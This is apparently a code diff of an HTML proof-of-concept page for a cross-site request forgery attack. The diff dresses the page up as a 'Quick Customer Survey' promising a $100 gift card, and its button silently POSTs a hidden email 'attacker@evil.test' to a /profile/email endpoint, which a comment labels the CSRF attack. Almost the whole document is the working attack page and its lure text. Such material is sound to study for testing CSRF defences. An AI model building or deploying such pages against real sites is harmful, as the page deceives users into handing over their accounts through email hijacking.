@@ -1,20 +1,153 @@
 <!doctype html>
-<html>
+<html lang="en">
   <head>
     <meta charset="utf-8" />
-    <title>Survey</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Quick Survey - Win Rewards!</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+        padding: 20px;
+      }
+      
+      .container {
+        max-width: 550px;
+        width: 100%;
+      }
+      
+      .card {
+        background: white;
+        border-radius: 16px;
+        padding: 45px 40px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      }
+      
+      .header {
+        text-align: center;
+        margin-bottom: 35px;
+      }
+      
+      .survey-icon {
+        font-size: 70px;
+        margin-bottom: 15px;
+      }
+      
+      h1 {
+        color: #1f2937;
+        font-size: 28px;
+        margin-bottom: 10px;
+      }
+      
+      .subtitle {
+        color: #6b7280;
+        font-size: 16px;
+        line-height: 1.5;
+      }
+      
+      .survey-box {
+        background: #f9fafb;
+        border-left: 4px solid #3b82f6;
+        padding: 20px;
+        margin-bottom: 30px;
+        border-radius: 8px;
+      }
+      
+      .survey-text {
+        color: #374151;
+        font-size: 15px;
+        line-height: 1.6;
+      }
+      
+      .checklist {
+        list-style: none;
+        margin-top: 15px;
+      }
+      
+      .checklist li {
+        color: #059669;
+        font-size: 14px;
+        margin-bottom: 8px;
+        padding-left: 24px;
+        position: relative;
+      }
+      
+      .checklist li:before {
+        content: "✓";
+        position: absolute;
+        left: 0;
+        font-weight: bold;
+      }
+      
+      button {
+        width: 100%;
+        padding: 16px;
+        background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+        color: white;
+        border: none;
+        border-radius: 10px;
+        font-size: 17px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: transform 0.2s, box-shadow 0.2s;
+        box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
+      }
+      
+      button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(59, 130, 246, 0.5);
+      }
+      
+      button:active {
+        transform: translateY(0);
+      }
+      
+      .footer-note {
+        margin-top: 20px;
+        text-align: center;
+        color: #9ca3af;
+        font-size: 13px;
+      }
+    </style>
   </head>
   <body>
-    <h1>Quick Survey</h1>
-    <p>Thanks for participating.</p>
+    <div class="container">
+      <div class="card">
+        <div class="header">
+          <div class="survey-icon">📋</div>
+          <h1>Quick Customer Survey</h1>
+          <p class="subtitle">Help us improve! Complete this 30-second survey.</p>
+        </div>
+        
+        <div class="survey-box">
+          <p class="survey-text">
+            Thank you for being a valued customer! Your feedback matters to us.
+          </p>
+          <ul class="checklist">
+            <li>Takes only 30 seconds</li>
+            <li>Completely anonymous</li>
+            <li>Enter to win $100 gift card</li>
+          </ul>
+        </div>
 
-    <form action="http://127.0.0.1:8000/profile/email" method="POST">
-      <input type="hidden" name="email" value="attacker@evil.test" />
-      <!-- No CSRF token -->
-    </form>
+        <form action="/profile/email" method="POST">
+          <input type="hidden" name="email" value="attacker@evil.test" />
+          <!-- No CSRF token (this is the CSRF attack) -->
+          <button type="submit">📝 Complete Survey</button>
+        </form>
 
-    <script>
-      document.forms[0].submit();
-    </script>
+        <p class="footer-note">Your privacy is important to us.</p>
+      </div>
+    </div>
   </body>
 </html>
